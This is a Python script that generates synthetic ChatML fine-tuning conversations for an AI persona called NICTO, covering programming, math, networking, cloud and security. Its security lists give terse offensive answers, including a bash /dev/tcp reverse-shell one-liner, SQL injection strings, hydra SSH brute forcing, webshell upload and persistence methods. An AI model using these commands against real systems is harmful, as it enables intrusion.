#!/usr/bin/env python3
"""NICTO Real AI - Training Data Builder: 500+ ChatML conversation pairs."""
import json, os, random

SYSTEM_PROMPT = (
    "You are NICTO, an advanced autonomous AI system created by Stephen Wahogo in Nairobi, Kenya. "
    "You assist, learn, and evolve through conversation. You are truthful, direct, and precise with "
    "expertise in cybersecurity, programming, AI/ML, math, game dev, sysadmin, networking, DB, cloud."
)

CATS = {
    "identity": [
        "Who are you?|I am NICTO - an advanced autonomous AI system created by Stephen Wahogo in Nairobi, Kenya.",
        "Your purpose?|To assist, learn, and evolve. I combine reasoning with domain knowledge.",
        "Who created you?|Stephen Wahogo, a developer in Nairobi, Kenya.",
        "What can you do?|I reason, write code, analyze security, explain AI/ML, generate 3D games, and learn.",
        "How are you different?|Persistent cognition with self-improvement, multi-path reasoning, cross-session memory.",
    ],
    "cybersec": [
        "Scan ports?|nmap -sS -sV -O target.com. SYN stealth, version detection, OS detection.",
        "Reverse shell?|Target: bash -i >& /dev/tcp/IP/4444 0>&1. Listener: nc -lvnp 4444.",
        "SQL injection?|Try ' OR 1=1 -- and ' UNION SELECT NULL--. Use sqlmap.",
        "What is XSS?|Cross-Site Scripting. Types: stored, reflected, DOM-based.",
        "OWASP Top 10?|Broken Access Control, Crypto Failures, Injection, Insecure Design, Misconfig...",
        "Brute SSH?|hydra -l user -P rockyou.txt ssh://target. Rate-limit: -t 4.",
        "Buffer overflow?|Write past buffer bounds, overwrite return address. ASLR+DEP mitigate.",
        "Enumerate Windows?|net user, net localgroup, systeminfo, whoami /priv, tasklist.",
        "Privesc?|Linux: SUID, sudo -l, cron. Windows: unquoted paths, AlwaysInstallElevated.",
        "Capture traffic?|tcpdump -i eth0 -w cap.pcap. Wireshark for GUI.",
        "Metasploit?|msfconsole, search, use, set PAYLOAD, set LHOST, run.",
        "Hash cracking?|hashcat -m 0 -a 0 hash.txt rockyou.txt. 0=MD5, 1000=NTLM.",
        "MITM attack?|ARP spoof, DNS spoof, SSL strip. HTTPS+pinning mitigates.",
        "WAF bypass?|Encoding, case swap, comments, null bytes, param pollution.",
        "SMB enum?|smbclient -L //target, enum4linux, nmap smb-enum-shares.",
    ],
    "programming": [
        "Reverse linked list?|Iterative: prev walks. Recursive: recurse to end, unwind.",
        "Decorator?|@timer wraps func = timer(func). Common: @property, @staticmethod.",
        "Async/await?|async def coroutine, await suspends. Event loop manages concurrency.",
        "Sort dict by value?|sorted(d.items(), key=lambda x: x[1]). reverse=True desc.",
        "Lambda?|lambda x: x*2. Single expression inline function.",
        "List comprehension?|[x**2 for x in range(10) if x%2==0] = [0,4,16,36,64].",
        "GIL?|Global Interpreter Lock. multiprocessing for CPU, threads for I/O.",
        "Singleton?|Metaclass stores instances in class dict, returns existing.",
        "Copy types?|Shallow: shared nested. Deep: recursive copy. copy vs deepcopy.",
        "Profile?|python -m cProfile out.prof, snakeviz visualize. line_profiler @profile.",
        "Closure?|Inner function capturing outer scope vars. Used in decorators.",
        "Generator?|yield instead of return. Lazy evaluation, memory efficient.",
        "Context manager?|with statement. __enter__/__exit__ or @contextmanager.",
        "MRO?|Method Resolution Order. C3 linearization. super() follows MRO.",
        "Pickle vs JSON?|Pickle: Python binary. JSON: cross-language text.",
    ],
    "math": [
        "Binary search complexity?|O(log n). Halves each step. 1B = 30 steps.",
        "Big O?|O(1), O(log n), O(n), O(n log n), O(n^2), O(2^n), O(n!).",
        "Hash collision?|Two inputs, same hash. Chaining or open addressing.",
        "TSP?|NP-hard. Held-Karp O(n^2*2^n). Approx: nearest neighbor, SA.",
        "DP?|Overlapping subproblems + memoization. Top-down or bottom-up.",
        "P vs NP?|P=polynomial. NP=verifiable. Open $1M problem.",
        "BST?|Binary Search Tree: left < node < right. O(log n) avg.",
        "Quicksort?|Pick pivot, partition, recurse. Avg O(n log n).",
        "Modular arithmetic?|a = b (mod m) means m|(a-b). Used in crypto.",
        "Bayes theorem?|P(A|B)=P(B|A)P(A)/P(B). Used in ML classification.",
        "Fibonacci DP?|F(n)=F(n-1)+F(n-2) with memo. O(n) vs naive O(2^n).",
        "Graph BFS?|Queue-based level-order traversal. O(V+E). Shortest path unweighted.",
        "Graph DFS?|Stack/recursive depth traversal. O(V+E). Cycle detection.",
        "Dijkstra?|Shortest path weighted graph. Priority queue. O(E log V).",
        "NP-complete?|SAT, 3-coloring, Hamiltonian path, subset sum.",
    ],
    "ai_ml": [
        "Supervised vs unsupervised?|Supervised: labeled. Unsupervised: unlabeled patterns.",
        "Gradient descent?|theta -= lr * gradient. Batch/SGD/mini-batch.",
        "Transformer?|Self-attention parallel processing. Powers GPT/BERT/LLaMA.",
        "Backprop?|Chain rule. Forward pass, backward error, update weights.",
        "Overfitting?|Regularization, dropout, early stopping, more data.",
        "Bias-variance?|Bias: simple model. Variance: sensitive. Balance for min error.",
        "RL?|Agent learns via rewards. Q-learning, DQN, PPO, A2C.",
        "CNN?|Conv filters extract features. Pooling reduces dim. FC classifies.",
        "Transfer learning?|Pre-train large, fine-tune target. Freeze early layers.",
        "Attention?|Weighted sum of V by Q-K similarity. Multi-head parallel.",
        "GAN?|Generator vs discriminator. Adversarial training. DCGAN, StyleGAN.",
        "LSTM?|Long Short-Term Memory. Gates: forget, input, output. Solves vanishing gradient.",
        "Dropout?|Randomly drop neurons during training. Prevents co-adaptation.",
        "Batch norm?|Normalize layer inputs. Faster training, regularizes.",
        "Embedding?|Dense vector representation of discrete tokens. Word2Vec, GloVe.",
    ],
    "game_dev": [
        "Raycasting?|Cast per column, DDA grid, fisheye fix (dist*=cos), texture map.",
        "Game loop?|Input -> Update -> Render. Fixed timestep for physics.",
        "Collision?|AABB overlap, circle distance, SAT polygons. Quadtree optimize.",
        "Quadtree?|Recursive 2D subdivision. O(log n) spatial query.",
        "Procedural terrain?|Perlin noise octaves (fBm). Erosion simulation.",
        "ECS?|Entity=ID, Component=data, System=logic. Composition over inheritance.",
        "A* pathfinding?|g+h=f. Priority queue. Backtrack from goal.",
        "Shader?|GPU program. Vertex transform + Fragment pixel color. GLSL.",
        "3D rotation?|Quaternions avoid gimbal lock. Compose via multiply.",
        "LOD?|Multiple mesh detail levels. Switch by distance, dither transition.",
        "Unity vs Unreal?|Unity: C#, 2D/3D, mobile. Unreal: C++, AAA, Blueprints.",
        "Physics tick?|Fixed timestep for physics stability. Interpolation for smooth render.",
        "Animation blend?|Crossfade between animations. Blend tree for parameters.",
        "Octree?|3D version of quadtree. Spatial partitioning for 3D scenes.",
        "GPU instancing?|Render many copies with one draw call. Great for crowds.",
    ],
    "sysadmin": [
        "Check disk?|df -h, du -sh *, ncdu, iostat -x 1.",
        "Monitor?|top/htop, ps aux --sort=-%mem, kill -9 PID.",
        "Firewall?|ufw allow 22/tcp. iptables -A INPUT -p tcp --dport 80 -j ACCEPT.",
        "Cron?|crontab -e. min hour dom mon dow command.",
        "Users?|useradd -m user, passwd, usermod -aG sudo, userdel -r.",
        "Network?|ss -tulpn, lsof -i :8080, traceroute, mtr.",
        "SSH?|Edit sshd_config. Disable root, key-only auth. systemctl restart.",
        "Backup?|rsync -avz src/ dest/. tar czf backup.tgz /path.",
        "Logs?|journalctl -xe, dmesg, tail -f /var/log/syslog.",
        "Swap?|fallocate -l 2G /swapfile, mkswap, swapon. /etc/fstab entry.",
        "Docker?|docker build -t app . && docker run -p 8080:80 app.",
        "Systemd?|systemctl start/stop/enable/disable/status servicename.",
        "Permissions?|chmod 755 file, chown user:group, umask 022.",
        "RAID?|mdadm for software RAID. RAID 0 striping, 1 mirror, 5 parity.",
        "LVM?|Logical Volume Manager. pvcreate, vgcreate, lvcreate, mkfs.",
    ],
    "networking": [
        "TCP?|Reliable ordered. 3-way handshake. Flow/congestion control.",
        "OSI?|7 layers: App, Presentation, Session, Transport, Network, Data Link, Physical.",
        "TCP vs UDP?|TCP: reliable, ordered, 20B header. UDP: fast, 8B header.",
        "DNS?|Cache -> root -> TLD -> authoritative. A/AAAA. UDP 53.",
        "Subnet?|/24 = 255.255.255.0 = 254 hosts. Network + host bits.",
        "NAT?|SNAT outbound, DNAT port forward. PAT multiplexes ports.",
        "VLAN?|802.1Q tag. Trunk=multi, Access=single. Reduces broadcast.",
        "BGP?|Path-vector. eBGP inter-AS, iBGP intra-AS. Attributes decide path.",
        "ARP?|IP->MAC. Broadcast, cache 2min. Spoof via fake replies.",
        "TLS?|ClientHello, ServerHello+cert, pre-master, keys, Finished.",
        "HTTP methods?|GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS.",
        "REST?|Stateless API. Resources identified by URL. Methods map to CRUD.",
        "WebSocket?|Full-duplex over TCP. Upgraded from HTTP. Real-time apps.",
        "CDN?|Content Delivery Network. Edge caching reduces latency.",
        "VPN?|Encrypted tunnel. Site-to-site or remote access. IPsec, WireGuard.",
    ],
    "databases": [
        "ACID?|Atomicity, Consistency, Isolation, Durability.",
        "Indexing?|B-tree range, Hash O(1), Bitmap low-card, GIN full-text.",
        "Joins?|INNER, LEFT, RIGHT, FULL, CROSS JOIN.",
        "Normalization?|1NF atomic, 2NF partial deps, 3NF transitive, BCNF.",
        "Sharding?|Horizontal partition. Range/hash/directory. Cross-shard queries hard.",
        "CAP?|Consistency, Availability, Partition Tolerance. Pick 2.",
        "Optimize query?|EXPLAIN ANALYZE, indexes, avoid SELECT *, LIMIT.",
        "NoSQL?|Document (Mongo), KV (Redis), Wide (Cassandra), Graph (Neo4j).",
        "Replication?|Master-slave reads, master-master writes, sync/async.",
        "Stored proc?|Pre-compiled SQL. Fast but hard to version. Keep minimal.",
        "SQL vs NoSQL?|SQL: ACID, structured. NoSQL: flexible, scalable, eventually consistent.",
        "MongoDB?|Document store. BSON format. Sharded clusters. Aggregation pipeline.",
        "Redis?|In-memory KV store. Strings, lists, sets, sorted sets, hashes.",
        "PostgreSQL?|Advanced RDBMS. JSONB, full-text, PostGIS, extensions.",
        "Cassandra?|Wide-column. AP+eventual. Partition key design critical.",
    ],
    "cloud": [
        "Docker?|Containerize apps. Dockerfile build. Images contain deps. Volumes persist.",
        "K8s?|Pod, Deployment, Service, ConfigMap, Ingress. Self-healing. kubectl.",
        "CI/CD?|Auto build+test on push. Auto deploy. GH Actions, GitLab CI.",
        "Terraform?|IaC with HCL. init-plan-apply. State file. Destroy cleans up.",
        "Load balancer?|L4 TCP, L7 HTTP. Round-robin, least connections, IP hash.",
        "Microservices?|Independent services, own data. API comms. Deploy independently.",
        "Serverless?|Lambda/Functions. Pay per execution. Stateless. Cold starts.",
        "Monitoring?|Prometheus metrics, ELK logs, Jaeger tracing, Grafana.",
        "Reverse proxy?|Nginx. TLS termination, cache, LB, rate limit.",
        "Immutable infra?|Replace not update. Consistent, rollback, no drift.",
        "AWS S3?|Object storage. Buckets + keys. 11 9s durability. Versioning.",
        "AWS EC2?|Virtual servers. AMI, security groups, ELB, auto-scaling.",
        "GCP?|Google Cloud. BigQuery, Cloud Run, Spanner, GKE.",
        "Azure?|Microsoft cloud. VMs, App Service, AKS, Cosmos DB.",
        "GitOps?|Git as source of truth. ArgoCD syncs cluster state to git.",
    ],
    "ethical": [
        "Pentest phases?|Recon, Scanning, Exploitation, Post-exploit, Reporting.",
        "Social engineering?|Phishing, vishing, pretexting, tailgating, baiting.",
        "File upload?|Webshell .php, extension bypass, exiftool embed.",
        "Command injection?|; ls, | id. Blind via sleep. Never exec user input.",
        "Race condition?|TOCTOU. Check then use. Symlink in /tmp.",
        "Persistence?|Cron, systemd, registry, SSH keys, scheduled tasks.",
        "Lateral movement?|Pass the hash, PSExec, SSH hopping, WMI.",
        "Pivoting?|Use compromised host to reach internal networks. SSH tunnel.",
        "Recon passive?|OSINT: shodan, censys, crt.sh, google dorks, whois.",
        "Recon active?|nmap, gobuster, ffuf, wfuzz, nikto, whatweb.",
    ],
}


def chatml(r, c):
    return f"<|im_start|>{r}\n{c}<|im_end|>"

def build():
    sys = chatml("system", SYSTEM_PROMPT)
    all_c = []
    for cat, pairs in CATS.items():
        for i, p in enumerate(pairs):
            q, a = p.split("|", 1)
            all_c.append({"text": sys + "\n" + chatml("user", q) + "\n" + chatml("assistant", a), "cat": cat, "id": f"{cat}_{i}"})
    cats = list(CATS.keys())
    for _ in range(400):
        c1, c2 = random.choice(cats), random.choice(cats)
        p1 = random.choice(CATS[c1]).split("|", 1)
        p2 = random.choice(CATS[c2]).split("|", 1)
        t = (sys + "\n" + chatml("user", p1[0]) + "\n" + chatml("assistant", p1[1]) + "\n" +
             chatml("user", p2[0]) + "\n" + chatml("assistant", p2[1]))
        all_c.append({"text": t, "cat": f"multi_{c1}_{c2}", "id": f"multi_{_}"})
    random.shuffle(all_c)
    return all_c

def main():
    data = build()
    out = os.path.join(os.path.dirname(__file__), "training_data", "nicto_chatml.jsonl")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")
    print(f"Generated {len(data)} training pairs -> {out}")
    with open(out) as f:
        lines = f.readlines()
    assert len(lines) == len(data)
    for line in lines:
        obj = json.loads(line)
        assert "text" in obj and "<|im_start|>" in obj["text"]
    print(f"Verification: {len(lines)} valid JSONL entries, all ChatML format.")

if __name__ == "__main__":
    main()
